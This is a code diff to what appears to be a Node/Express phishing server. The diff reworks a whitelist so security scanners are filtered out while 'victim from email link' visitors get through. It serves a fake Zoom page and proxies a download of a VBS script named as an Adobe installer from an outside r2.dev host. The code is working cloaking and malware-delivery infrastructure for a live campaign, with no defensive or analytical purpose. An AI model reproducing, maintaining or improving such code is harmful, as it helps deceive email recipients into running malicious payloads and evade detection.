@@ -156,35 +156,31 @@ const SCANNER_UA_PATTERNS = [
   'whatsapp', 'linkedinbot'
 ];
 
+// function getClientIp(req) {
+//   return req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
+//          req.headers['x-real-ip'] ||
+//          req.ip ||
+//          req.connection?.remoteAddress ||
+//          '0.0.0.0';
+// }
+
 function getClientIp(req) {
-  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
-         req.headers['x-real-ip'] ||
-         req.ip ||
-         req.connection?.remoteAddress ||
-         '0.0.0.0';
+    return req.ip || '0.0.0.0';
 }
 
 // ======= Whitelist Check =======
 function isWhitelisted(req) {
     const ip = getClientIp(req);
-    const ua = req.get('User-Agent') || '';
+    
+    // Local dev
+    if (ip === '127.0.0.1' || ip === '::1' || ip.startsWith('192.168.') || ip.startsWith('10.')) return true;
+    
+    // Direct navigation (victim from email link) — let through if not scanner
     const referer = req.get('Referer') || '';
+    if (!referer) return false; // Let it fall through to scanner check
     
-    // Allow your own domain's requests
-    if (referer && referer.includes('cdn-service-s3.ink')) { // CHANGE THIS to your actual domain
-        return true;
-    }
-    
-    // Allow localhost for testing
-    if (ip === '127.0.0.1' || ip === '::1' || ip.startsWith('192.168.') || ip.startsWith('10.')) {
-        return true;
-    }
-    
-    // Allow known good browsers (Chrome, Firefox, Safari, Edge)
-    const goodBrowsers = ['chrome', 'firefox', 'safari', 'edg', 'opr'];
-    if (goodBrowsers.some(browser => ua.toLowerCase().includes(browser))) {
-        return true;
-    }
+    // Click from own domain (multi-page flow)
+    if (referer.includes(process.env.DOMAIN)) return true;
     
     return false;
 }
@@ -297,7 +293,7 @@ app.use((req, res, next) => {
 
 
 // ======= VBS Download Proxy =======
-app.get('/download/vbs/:type', async (req, res) => {
+app.get('/download/vbs/:type', apiLimiter, async (req, res) => {
     try {
         const { type } = req.params;
         const vbsUrl = 'https://pub-05a36c67a70d476394cc0b8a3f67777f.r2.dev/adobeinstv267.vbs';
@@ -353,7 +349,7 @@ app.get('/', (req, res) => {
 });
 
 app.get('/zoom/:zoomId', (req, res) => {
-  log('info', { event: 'serve_zoom', ip: getClientIp(req), docId: req.params.docId });
+  log('info', { event: 'serve_zoom', ip: getClientIp(req), docId: req.params.zoomId });
   return res.sendFile(path.join(__dirname, 'pages', 'zoom.html'));
 });
 
